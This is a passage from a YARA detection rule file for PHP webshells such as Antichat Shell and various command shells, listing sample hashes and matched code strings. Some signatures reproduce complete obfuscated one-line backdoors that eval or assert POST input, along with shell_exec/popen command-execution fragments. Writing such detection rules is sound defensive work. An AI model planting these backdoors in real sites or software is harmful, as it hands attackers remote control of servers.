      $s8 = "<tr><td>To</td><td><input type='text' id='mailTo' value='' onkeydown=\\\"trap_enter(event, 'mail_send');\\\"></td></tr>" fullword ascii
      $s9 = "$headers .= \"Content-Disposition: attachment\\r\\n\\r\\n\";" fullword ascii
      $s10 = "$content = chunk_split(base64_encode(read_file($file)));" fullword ascii
      $s11 = "$GLOBALS['module']['mail']['js_ontabselected'] = \"if(!portableMode) $('#mailFrom').focus();\";" fullword ascii
      $s12 = "$headers .= $content.\"\\r\\n\\r\\n\";" fullword ascii
      $s13 = "$headers = \"MIME-Version: 1.0\\r\\n\".$from;" fullword ascii
      $s14 = "if(@mail($to, $subject, \"\", $headers)) return true;" fullword ascii
      $s15 = "$GLOBALS['module']['mail']['content'] = \"" fullword ascii
      $s16 = "$mailContent = trim($p['mailContent']);" fullword ascii
      $s17 = "$headers .= \"--\".$rand.\"\\r\\n\";" fullword ascii
      $s18 = "$headers .= \"--\".$rand.\"--\\r\\n\";" fullword ascii
      $s19 = "$headers .= $msg.\"\\r\\n\\r\\n\";" fullword ascii
      $s20 = "$mailFrom = \"From: \".$mailFrom.\"\\r\\nReply-To: \".$mailFrom.\"\\r\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _8d23f3d3f678d3e620b91c2115e1f714_adminer_4_1_0_mysql_adminer_4_2_4_2_Adminer___Compact_database_management_192
{
   meta:
      description = "php17 - from files 8d23f3d3f678d3e620b91c2115e1f714.php, adminer-4.1.0_mysql.php, adminer-4.2.4_2.php, Adminer_-_Compact_database_management.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a8d9f5df8a604e75e87670bc1d797bb49cc1047f722a8630bda514fdc407f84f"
      hash2 = "21f2c335b1d7810398862df20ab65ab1c67b188ce80f71d11fe32071f0894ebe"
      hash3 = "ea21b95da1a2f66d26849160f3257823254663144e6b3b506c35160b70c7b3bd"
      hash4 = "4baf99c68ca9632081ba8bc0458bfc87fc70e526742803b7b77a45f70d7adf07"
   strings:
      $s1 = "set_session($x,$X){$_SESSION[$x][DRIVER][SERVER][$_GET[\"username\"]]=$X;}function" fullword ascii
      $s2 = "get_rows('SELECT sess.process AS \"process\", sess.username AS \"user\", sess.schemaname AS \"schema\", sess.status AS \"status" ascii
      $s3 = "is->error=mssql_get_last_message();return(bool)$this->_link;}function" fullword ascii
      $s4 = "get_vals(\"SELECT DISTINCT owner FROM dba_segments WHERE owner IN (SELECT username FROM dba_users WHERE default_tablespace NOT I" ascii
      $s5 = "Min_DB{var$extension=\"sqlsrv\",$_link,$_result,$server_info,$affected_rows,$errno,$error;function" fullword ascii
      $s6 = "Min_DB{var$extension=\"oci8\",$_link,$_result,$server_info,$affected_rows,$errno,$error;function" fullword ascii
      $s7 = "close(){$this->_link=@pg_connect(\"$this->_string dbname='postgres'\");}function" fullword ascii
      $s8 = "get_rows('SELECT sess.process AS \"process\", sess.username AS \"user\", sess.schemaname AS \"schema\", sess.status AS \"status" ascii
      $s9 = "Min_SQLite{var$extension=\"SQLite3\",$server_info,$affected_rows,$errno,$error,$_link;function" fullword ascii
      $s10 = "l_description(c.oid, a.attnum) AS comment" fullword ascii
      $s11 = "ORDER BY PROCESS" fullword ascii
      $s12 = "table($t){return($_GET[\"ns\"]!=\"\"?idf_escape($_GET[\"ns\"]).\".\":\"\").idf_escape($t);}function" fullword ascii
      $s13 = "get_vals(\"SELECT DISTINCT owner FROM dba_segments WHERE owner IN (SELECT username FROM dba_users WHERE default_tablespace NOT I" ascii
      $s14 = "stop_session(){if(!ini_bool(\"session.use_cookies\"))session_write_close();}function&get_session($x){return$_SESSION[$x][DRIVER]" ascii
      $s15 = "stop_session(){if(!ini_bool(\"session.use_cookies\"))session_write_close();}function&get_session($x){return$_SESSION[$x][DRIVER]" ascii
      $s16 = "POST[\"drop_col\"])return" fullword ascii
      $s17 = "AND relnamespace = (SELECT oid FROM pg_namespace WHERE nspname = current_schema())" fullword ascii
      $s18 = "UNION SELECT view_name, 'view' FROM user_views" fullword ascii
      $s19 = "FROM v$session sess LEFT OUTER JOIN v$sql sql" fullword ascii
      $s20 = "as$x=>$X)json_row($x);echo\";\\n\",\"selectFieldChange(document.getElementById('form'));\\n\",\"</script>\\n\",\"</div></fieldse" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1f1a80153e0fc2ec0b688b66949afb49f1897914_8c5b26f383a4b176a12657b913f35d2a639ea054_Antichat_Shell_Modified_by_Go0o_antichat_193
{
   meta:
      description = "php17 - from files 1f1a80153e0fc2ec0b688b66949afb49f1897914.php, 8c5b26f383a4b176a12657b913f35d2a639ea054.php, Antichat-Shell-Modified-by-Go0o.php, antichat.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da39f93031e1ca0bd919e5a062b01d0bf39b52e88919ebae40a1379523ccab37"
      hash2 = "f633b6f8fbec621cd8ce60cd786926d3f4a552cc75375ec875ee8e9e4735ba4b"
      hash3 = "176def90c34fe4bb92b70f326e41fea5b020de5ab9ddba7e7137f49668353955"
      hash4 = "6d7af399cf9d9ef4f90454a35ad31bc41884035c8c7a5d12ff924007a698a039"
   strings:
      $s1 = "@$login = $_POST['login'];" fullword ascii
      $s2 = "$ret = @shell_exec($cmd);" fullword ascii
      $s3 = "$content .= \"<td>&nbsp;</td><td bgcolor=#44474f>$nst_inside</td>\\r\\n\";" fullword ascii
      $s4 = "$form_win = \"<table><form method=POST enctype=multipart/form-data>" fullword ascii
      $s5 = "$content .= \"<table><a href=\\\"#\\\" onclick=\\\"document.dump1.db.value='$str[0]';document.dump1.tbl.value='$str[0]';document" ascii
      $s6 = "$content .= \"<table cellpadding=0 cellspacing=1><tr>\";" fullword ascii
      $s7 = "@$port = $_POST['port'];" fullword ascii
      $s8 = "$pass_de = $_POST[pass_de];" fullword ascii
      $s9 = "@$php_self = $_POST['PHP_SELF'];" fullword ascii
      $s10 = "@$inside = $_POST['inside'];" fullword ascii
      $s11 = "@$adress = $_POST['adress'];" fullword ascii
      $s12 = "@$conn = $_POST['conn'];" fullword ascii
      $s13 = "$content .= \"<td valign=top>" fullword ascii
      $s14 = "@$base = $_POST['base'];" fullword ascii
      $s15 = "$content .= \"</table>\";" fullword ascii
      $s16 = "$chars = $_POST[chars];" fullword ascii
      $s17 = "@$db = $_POST['db'];" fullword ascii
      $s18 = "@$tbl = $_POST['tbl'];" fullword ascii
      $s19 = "$content .= \"<tr>\";" fullword ascii
      $s20 = "$self = $HTTP_SERVER_VARS['PHP_SELF'];" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _27f39fe03b8a845d353c707efc8e2766_27f39fe03b8a845d353c707efc8e2766_4b14493c7c423b2a0dc04906f216fb96a8c6c90f_4b14493c7c423b2a_194
{
   meta:
      description = "php17 - from files 27f39fe03b8a845d353c707efc8e2766.php, 27f39fe03b8a845d353c707efc8e2766.php, 4b14493c7c423b2a0dc04906f216fb96a8c6c90f.php, 4b14493c7c423b2a0dc04906f216fb96a8c6c90f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "779752359badcd612a27b14adc73a179a406ba6927876ed1ff32e7c347d1bb60"
      hash2 = "779752359badcd612a27b14adc73a179a406ba6927876ed1ff32e7c347d1bb60"
      hash3 = "03207c8670299d503957dda5b2a31912978c6dc9810548665a31fe6ef1cd56b8"
      hash4 = "03207c8670299d503957dda5b2a31912978c6dc9810548665a31fe6ef1cd56b8"
   strings:
      $s1 = "$link=mysql_connect(\"\".$host.\":\".$port.\"\",$user,$pass) or die(\"cant connect: \".mysql_error().\"\".$pageend.\"\");" fullword ascii
      $s2 = "if ($download != \"1\" and empty($_POST[\"edt\"])) {" fullword ascii
      $s3 = "$shelltext=$_POST[\"command\"];" fullword ascii
      $s4 = "echo \"<font color=\\\"green\\\">safe mode: OFF</font> || hello php-5.1.6 bugs<br>\";" fullword ascii
      $s5 = "<input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"\".$_POST[\"dir\"].\"\\\">" fullword ascii
      $s6 = "@proc_close($process);" fullword ascii
      $s7 = "$buffer.=fread($pipes[1],1024);" fullword ascii
      $s8 = "$user=$_POST['user'];" fullword ascii
      $s9 = "if(function_enabled('posix_getpwuid')) {" fullword ascii
      $s10 = "switch ($_POST[\"wut\"]) {" fullword ascii
      $s11 = "$filee=trim($_POST[\"filee\"]);" fullword ascii
      $s12 = "if (strnatcmp(version(),\"5.2.9\") <= 0) {" fullword ascii
      $s13 = "if (!empty($_POST[\"edit\"])) {" fullword ascii
      $s14 = "if (empty($_POST[\"dir\"])) {" fullword ascii
      $s15 = "$files=trim($_POST[\"files\"]);" fullword ascii
      $s16 = "$unixtime=mktime($time[0],$time[1],$time[2],$day[1],$day[2],$day[0]);" fullword ascii
      $s17 = "$user=\"root\";" fullword ascii
      $s18 = "$db=$_POST['db'];" fullword ascii
      $s19 = "<input type=\\\"hidden\\\" name=\\\"p\\\" value=\\\"f\\\">" fullword ascii
      $s20 = "//author/license unknown" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _483589fa9e7d23be4505064f83ba6bedc824aab2_785cacb423cc7049f53f05efa06ec92f45fedad7_195
{
   meta:
      description = "php17 - from files 483589fa9e7d23be4505064f83ba6bedc824aab2.php, 785cacb423cc7049f53f05efa06ec92f45fedad7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "403ab77fbfdcee54e3aca528e77266a31f5fd84ea57ab380f9b0799c9e018f6e"
      hash2 = "a7307f7dcb58a17e74f2457bc6052188e843749af7d69bf42b0656093e85a1a6"
   strings:
      $s1 = "<?php $e = $_REQUEST['e'];$arr = array($_POST['settoken'],);array_map(base64_decode($e), $arr);?>" fullword ascii
      $s2 = "* $a=$_POST[];  " fullword ascii
      $s3 = "http://192.168.1.5/x.php?x=lostwolf  " fullword ascii
      $s4 = "<?php $lang = (string)key($_POST);$lang($_POST['test']);?>" fullword ascii
      $s5 = "<?php $x_x=base64_decode(Y.X.N.z.Z.X.J01);$x_x(($_POST[$_GET[a]]));?>" fullword ascii
      $s6 = "<?php $a = base64_decode(Y.X.N.z.Z.X.J01);$a($_POST[g]);?>" fullword ascii
      $s7 = "<?php  $a = \"a\".\"s\".\"s\".\"e\".\"r\".\"t\";  $a($_POST[cc]);  ?>" fullword ascii
      $s8 = "<?php $a = str_replace(x,\"\",\"axsxxsxexrxxt\");$a($_POST[\"#\"]); ?>" fullword ascii
      $s9 = "$str=$rc->getDocComment();  " fullword ascii
      $s10 = "?id=eval%28base64_decode%28%22QGV2YWwoJF9QT1NUWydjJ10pOw%22%29%29; " fullword ascii
      $s11 = "/*--------------------------------------------------------------------------------*/ " fullword ascii
      $s12 = "$array[0]['wind']($_POST['xiaozhe']); " fullword ascii
      $s13 = "* assert  " fullword ascii
      $s14 = "]);eval($Exp($_POST[z0]));?>" fullword ascii
      $s15 = "<?php $Exp=strrev($_POST[" fullword ascii
      $s16 = "<?php $p=base64_decode(\"bW93YW5n\");$i['j']='assert';$a[]=$i;@$a[0]['j']($_POST[$p]);$filename = $php_self=substr($_SERVER['PHP" ascii
      $s17 = "[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>" fullword ascii
      $s18 = "<?php $p=base64_decode(\"bW93YW5n\");$i['j']='assert';$a[]=$i;@$a[0]['j']($_POST[$p]);$filename = $php_self=substr($_SERVER['PHP" ascii
      $s19 = "settoken" fullword ascii
      $s20 = "array_map(\"ass\\x65rt\",(array)$_REQUEST['zhe']);?>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 10KB and ( 8 of them )
      ) or ( all of them )
}

rule _06964dce9addb1c5cb5d6e3d9838f733_68112f6cbb4bdffee48f32bf115e2b507cb610ef_78b42634863a4e2148a7441b32436372dea0d11a_196
{
   meta:
      description = "php17 - from files 06964dce9addb1c5cb5d6e3d9838f733.php, 68112f6cbb4bdffee48f32bf115e2b507cb610ef.php, 78b42634863a4e2148a7441b32436372dea0d11a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e572db25a8b68d8eeae168e4363006d752f08de169b7ce91156d0e86d9ec798f"
      hash2 = "cbaa0b37299f99afe1a0f5968c7e9988e04a6003af36517aa8d715c364b9ae4e"
      hash3 = "c8ec43d7ae0d96e7fcd4b1262cdac036dace5ed8ffc3c06ed57e307fdf7fcb4f"
   strings:
      $x1 = "echo \"<li><a href='$PHP_SELF?action=utils&command=show_processlist'>Processlist</a>\\n\";" fullword ascii
      $s2 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_logs'>Logs</a>\\n\";" fullword ascii
      $s3 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_hosts'>Hosts</a>\\n\";" fullword ascii
      $s4 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_privileges'>Privileges</a>\\n\";" fullword ascii
      $s5 = "echo \"<a href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>\\n\";" fullword ascii
      $s6 = "echo \"<td><a href='$PHP_SELF?action=dumpDB&dbname=$dbname'>Dump</a></td>\\n\";" fullword ascii
      $s7 = "$M, $D, $unsigned, $zerofill, $binary, $not_null, $default_value, $auto_increment, $primary_key, $valuelist;" fullword ascii
      $s8 = "$pResult = mysql_query( $queryStr =  \"SELECT * FROM $tablename WHERE $key\", $mysqlHandle );" fullword ascii
      $s9 = "echo \"<li><a href='$PHP_SELF?action=utils&command=show_variables'>Variables</a>\\n\";" fullword ascii
      $s10 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_tables'>Tables</a>\\n\";" fullword ascii
      $s11 = "echo \"<tr><td>Password </td><td> <input type=password name=password></td></tr>\\n\";" fullword ascii
      $s12 = "echo \"<li><a href='$PHP_SELF?action=utils&command=show_status'>Status</a>\\n\";" fullword ascii
      $s13 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_status'>Status</a>\\n\";" fullword ascii
      $s14 = "echo \"<form action='$PHP_SELF?action=viewData&dbname=$dbname&tablename=$tablename' method=post>\\n\";" fullword ascii
      $s15 = "echo \"<META HTTP-EQUIV=Refresh CONTENT='0; URL=$PHP_SELF?action=listDBs'>\";" fullword ascii
      $s16 = "* `D' applies to floating-point types and indicates the number of digits following the decimal point.<br>" fullword ascii
      $s17 = "echo \"<td><a href='$PHP_SELF?action=editData&dbname=$dbname&tablename=$tablename$key'>Edit</a></td>\\n\";" fullword ascii
      $s18 = "echo \"<td><a href='$PHP_SELF?action=editField&dbname=$dbname&tablename=$tablename&fieldname=$fieldname'>Edit</a></td>\\n\";" fullword ascii
      $s19 = "<tr><th>not null</th><th>default value</th><th>auto increment</th><th>primary key</th></tr>" fullword ascii
      $s20 = "echo \"<tr><td>Username </td><td> <input type=text name=username></td></tr>\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _060ad92489947d410d897474079c1477_06521d9b70a37cb6455a9684ef3db13944feca2e_25b2ffa40e50b038212591c4eb09a89fe10cbd43_35b0448c_197
{
   meta:
      description = "php17 - from files 060ad92489947d410d897474079c1477.php, 06521d9b70a37cb6455a9684ef3db13944feca2e.php, 25b2ffa40e50b038212591c4eb09a89fe10cbd43.php, 35b0448cd3e328b11521ab053ea0c99694119b82.php, 75aa5981c7740da3a645cd272029090750474ae1.php, 7e4723914113dcea43f5c7fe31576b45ab97bd12.php, 98d13eea07f57d3b4a2c5079cc27659dde6ebfad.php, a2baa41f5667eb2a3ad57003105e57ed0000af38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "70d1d6937c7b00d4909ff80dcadc7771349d918f99e3515038d550a3d8ac90f2"
      hash2 = "9ebb24b9f38a0cfb5be43a43933fc36aa47140089a5b07560130a88e0c887fed"
      hash3 = "33b0ffc5c6dcf69ccabd978d0c8995f2f4d35d94c5dbbf350f7ded03e6ed82a0"
      hash4 = "b87a5779c3b9ff9e4830be35799a297d9f7dce01d62b6953126f80e969e2a40e"
      hash5 = "007005ffbf899f70fe325993556129086702958b592d4bf22d8465d202a1b11f"
      hash6 = "d37e7daffca28c0d039f1c41e0d960cb912975fa51e391d12eb7330e983cb5de"
      hash7 = "9ca48c9df4cd95c76600fc0ae6b525c7adc9edfb606ca5fe24aab23d952de256"
      hash8 = "7c07c724d568753b57ae312c6a01c30b0eb9b7117165ef6519d0c125fe751f08"
   strings:
      $x1 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $s2 = "t.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>\";" fullword ascii
      $s3 = "$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);" fullword ascii
      $s4 = "$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';" fullword ascii
      $s5 = "p2'].\"</span> ({$num['n']} records) Page # <input type=text name='p3' value=\" . ((int)$_POST['p3']) . \">\";" fullword ascii
      $s6 = "echo \" <a href=# onclick='st(\\\"\" . $_POST['p2'] . '\", ' . ($_POST['p3']-1) . \")'>&lt; Prev</a>\";" fullword ascii
      $s7 = "echo \" <a href=# onclick='st(\\\"\" . $_POST['p2'] . '\", ' . ($_POST['p3']+1) . \")'>Next &gt;</a>\";" fullword ascii
      $s8 = "\" . (empty($_POST['sql_count'])?'&nbsp;':\" <small>({$n['n']})</small>\") . \"</nobr><br>\";" fullword ascii
      $s9 = "$db->dump($v, $fp);" fullword ascii
      $s10 = "if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {" fullword ascii
      $s11 = "die('<script>alert(\"Error! Can\\'t open file\");window.history.back(-1)</script>');" fullword ascii
      $s12 = "if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile'))" fullword ascii
      $s13 = "return $this->fetch($this->query(\"SELECT LOAD_FILE('\".addslashes($str).\"') as file\"));" fullword ascii
      $s14 = "$_POST['p3'] = $_POST['p3']?$_POST['p3']:1;" fullword ascii
      $s15 = "} elseif($fp = @fopen($_POST['file'], 'w')) {" fullword ascii
      $s16 = "if(@$_POST['type']=='pgsql')echo 'selected';" fullword ascii
      $s17 = "if(@$_POST['type']=='mysql')echo 'selected';" fullword ascii
      $s18 = "echo htmlspecialchars($_POST['p2']);" fullword ascii
      $s19 = "if($_POST['p3'] < $pages)" fullword ascii
      $s20 = "if(empty($_POST['file'])) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a42ba22fb215f755779cf3afe417121b_a79be3a055b701ad9977b5176d0478aa0b0dffd4_198
{
   meta:
      description = "php17 - from files a42ba22fb215f755779cf3afe417121b.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "125e3c37d402fad550e624cf724a30af87bd3a4c4c49f0dbd70e794d439f8fe2"
      hash2 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
   strings:
      $s1 = "* as an internal shell command. */" fullword ascii
      $s2 = "/* Build the command history for use in the JavaScript */" fullword ascii
      $s3 = "/* The current command is a 'cd' command which we have to handle" fullword ascii
      $s4 = "$_SESSION['output'] .= htmlspecialchars(fgets($io[2])," fullword ascii
      $s5 = "$_SESSION['output'] .= htmlspecialchars(fgets($io[1])," fullword ascii
      $s6 = "* changing the directory and save the output. */" fullword ascii
      $s7 = "$new_dir = preg_replace('|/?[^/]+/\\.\\.(?!\\.)|', '', $new_dir);" fullword ascii
      $s8 = "/* Now append the commmand to the output. */" fullword ascii
      $s9 = "$js_command_hist = '\"\", \"' . implode('\", \"', $escaped) . '\"';" fullword ascii
      $s10 = "$js_command_hist = '\"\"';" fullword ascii
      $s11 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword ascii
      $s12 = "while (preg_match('|/\\.\\.(?!\\.)|', $new_dir))" fullword ascii
      $s13 = "/* Read output sent to stderr. */" fullword ascii
      $s14 = "/* Read output sent to stdout. */" fullword ascii
      $s15 = "/* Relative path, we append it to the current working" fullword ascii
      $s16 = "2 => array('pipe', 'w'))," fullword ascii
      $s17 = "* directory. */" fullword ascii
      $s18 = "/* Absolute path, we use it unchanged. */" fullword ascii
      $s19 = "array(1 => array('pipe', 'w')," fullword ascii
      $s20 = "/* Initialize the current working directory. */" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _20784cd31c22ddaa849b6c93042df34c1d462ab9_6f1a2aa579a8ecd60d17677f0cd211c4090500f6_a9b8077357065b95c2bc7f3ffa7baea65895d920_199
{
   meta:
      description = "php17 - from files 20784cd31c22ddaa849b6c93042df34c1d462ab9.php, 6f1a2aa579a8ecd60d17677f0cd211c4090500f6.php, a9b8077357065b95c2bc7f3ffa7baea65895d920.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash2 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash3 = "623d482f0f99bd37b67b2e98b697b7a19c08b2e296fd83fed439627b5a30cd3b"
   strings:
      $x1 = "$_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s2 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s3 = "echo $table_up1.$lang[$language.'_text81'].$table_up2.$ts.\"<tr>\".$fs.\"<td valign=top width=34%>\".$ts;" fullword ascii
      $s4 = "echo $table_up1.$lang[$language.'_text82'].$table_up2.$ts.\"<tr>\".$fs.\"<td valign=top width=34%>\".$ts;" fullword ascii
      $s5 = "echo \" | - \".$row2['TABLE_NAME'].\"\\r\\n\";" fullword ascii
      $s6 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text40'].\"</div></b></font>\";" fullword ascii
      $s7 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text12'].\"</div></b></font>\";" fullword ascii
      $s8 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text22'].\"</div></b></font>\";" fullword ascii
      $s9 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text77'].\"</div></b></font>\";" fullword ascii
      $s10 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text9'].\"</div></b></font>\";" fullword ascii
      $s11 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text83'].\"</div></b></font>\";" fullword ascii
      $s12 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW DATABAS" ascii
      $s13 = "echo $fs.$table_up1.$lang[$language.'_text32'].$table_up2.$font;" fullword ascii
      $s14 = "\\nSELECT * FROM user;\")).\"</textarea><br>\".in('submit','submit',0,$lang[$language.'_butt1']).\"</div></td>\".$fe.\"</tr></ta" ascii
      $s15 = "echo $fs.$table_up1.$lang[$language.'_text76'].$table_up2.$ts;" fullword ascii
      $s16 = "echo $fs.$table_up1.$lang[$language.'_text67'].$table_up2.$ts;" fullword ascii
      $s17 = "echo $fs.$table_up1.$lang[$language.'_text35'].$table_up2.$ts;" fullword ascii
      $s18 = "echo $fs.$table_up1.$lang[$language.'_text33'].$table_up2.$ts;" fullword ascii
      $s19 = "echo $fs.$table_up1.$lang[$language.'_text15'].$table_up2.$ts;" fullword ascii
      $s20 = "echo $fs.$table_up1.$lang[$language.'_text28'].$table_up2.$ts;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01e00f2f4bfcbb7505cb641066f2859b_Antichat_Shell_v1_3_Antichat_S22hell_Antichat_Shell_Antichat_Shell_v1_3_200
{
   meta:
      description = "php17 - from files 01e00f2f4bfcbb7505cb641066f2859b.php, Antichat Shell v1.3.php, Antichat-S22hell.php, Antichat_Shell.php, Antichat_Shell_v1.3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2b2df68c7c4b3ed7538a025388148d1a9031c82ecd1223c9c8024b56873a4564"
      hash2 = "622626ee21ff7543ebb8f65cb7739ad38f2a17ffd79a0a7c886a6bd808c04cc4"
      hash3 = "3f9e7dc6a8a8b8d361a99822f06920a0072022909b39a19e0d15311956f2eb12"
      hash4 = "33361e366e1fb244ce261c1cf1dd874d167265f26c31fa4ad15884ebc16dabc2"
      hash5 = "8cb451d747ba914829f0eaa6fffc8dbef100500606302cb93012ede460d7777f"
   strings:
      $s1 = "<textarea readonly rows=\\\"15\\\" cols=\\\"150\\\">\".@htmlspecialchars(shell($_POST['command'])).\"</textarea><br>" fullword ascii
      $s2 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='shell'; document.reqs.submit();\">| Shell </a></td>" fullword ascii
      $s3 = "eqs.submit();\">'.$files[$i].'</a><br></td><td>file</td><td>'.view_size(filesize($linkfile)).'</td>" fullword ascii
      $s4 = "<textarea name=\\\"data\\\" rows=\\\"40\\\" cols=\\\"180\\\">\".@readf($file).\"</textarea><br>" fullword ascii
      $s5 = "function shell($cmd){" fullword ascii
      $s6 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='exit'; document.reqs.submit();\">| EXIT |</a></td>" fullword ascii
      $s7 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='viewer'; document.reqs.submit();\">| Viewer</a></td>" fullword ascii
      $s8 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='editor'; document.reqs.submit();\">| Editor</a></td>" fullword ascii
      $s9 = "//end shell" fullword ascii
      $s10 = ";\" title=\"Download\">D</a>" fullword ascii
      $s11 = "while(!feof($fp)){$result.=fread($fp,1024);}" fullword ascii
      $s12 = "$fp = popen($cmd,\"r\");" fullword ascii
      $s13 = "it();\"> '.chr($j).'<a/>';" fullword ascii
      $s14 = "<a href=\"#\" onclick=\"document.reqs.action.value=\\'download\\'; document.reqs.file.value=\\''.$linkfile.'\\'; document.reqs.s" ascii
      $s15 = "<a href=\"#\" onclick=\"document.reqs.action.value=\\'download\\'; document.reqs.file.value=\\''.$linkfile.'\\'; document.reqs.s" ascii
      $s16 = "echo \"<tr><td>OS: \".@php_uname().\"</td></tr>" fullword ascii
      $s17 = "<input name='action' type='hidden' value=''>" fullword ascii
      $s18 = "<input name='file' type='hidden' value=''>" fullword ascii
      $s19 = "<table style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 bo" ascii
      $s20 = "echo \"<tr><td><form method=POST>Open directory:<input type=text name=dir value=\\\"\".$dir.\"\\\" size=50><input type=submit va" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 70KB and ( 8 of them )
      ) or ( all of them )
}

rule _5fcd5044168b365b8b9dd6beaab31287a2117492_6a00ee40c8ed4bdbd5a70b8ec5469a969d2ec898_201
{
   meta:
      description = "php17 - from files 5fcd5044168b365b8b9dd6beaab31287a2117492.php, 6a00ee40c8ed4bdbd5a70b8ec5469a969d2ec898.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "de88437636b6e80c9e5d6d490ee5d497d954654b588180d60a31ebcd30224a2c"
      hash2 = "d2879466f3b3d36acd43a093d6ab55dda7b4e61f3717af80530e0c84822c3d2a"
   strings:
      $s1 = "$filecontents = stripslashes(html_entity_decode($_POST[\"contents\"]));" fullword ascii
      $s2 = "$status = \"<font face='Verdana' style='font-size: 8pt'>Error or No contents in file</font>\";" fullword ascii
      $s3 = "$filecontents = htmlentities(file_get_contents($filename));" fullword ascii
      $s4 = "echo '<a target=\"blank\" href='.$file.'>'.$file.'</a><br>';" fullword ascii
      $s5 = "$status = \"<font face='Verdana' style='font-size: 8pt'>Could not open file for write access! </font>\";" fullword ascii
      $s6 = "&nbsp;</font><?php @$output = include($_POST['incl']); ?></td>" fullword ascii
      $s7 = "print '<font face=\"Verdana\" color=\"#008000\" style=\"font-size:10pt\"><b>Safe Mode OFF</b></font>';" fullword ascii
      $s8 = "print '<font face=\"Verdana\" color=\"#FF0000\" style=\"font-size:10pt\"><b>Safe Mode ON</b></font>';" fullword ascii
      $s9 = "$status = \"<font face='Verdana' style='font-size: 8pt'>Could not delete file!</font>\";" fullword ascii
      $s10 = "$status = \"<font face='Verdana' style='font-size: 8pt'>File successfully deleted!</font>\";" fullword ascii
      $s11 = "$filecontents = htmlentities($filecontents);" fullword ascii
      $s12 = "$status = \"<font face='Verdana' style='font-size: 8pt'>No file loaded!</font>\";" fullword ascii
      $s13 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ File Editor ]</font></td>" fullword ascii
      $s14 = "$status = \"<font face='Verdana' style='font-size: 8pt'>File does not exist!</font>\";" fullword ascii
      $s15 = "else if($_POST[\"submit\"] == \"Delete\")" fullword ascii
      $s16 = "$filename = $_POST[\"filename\"];" fullword ascii
      $s17 = "if($_POST[\"submit\"] == \"Open\")" fullword ascii
      $s18 = "else if($_POST[\"submit\"] == \"Save\")" fullword ascii
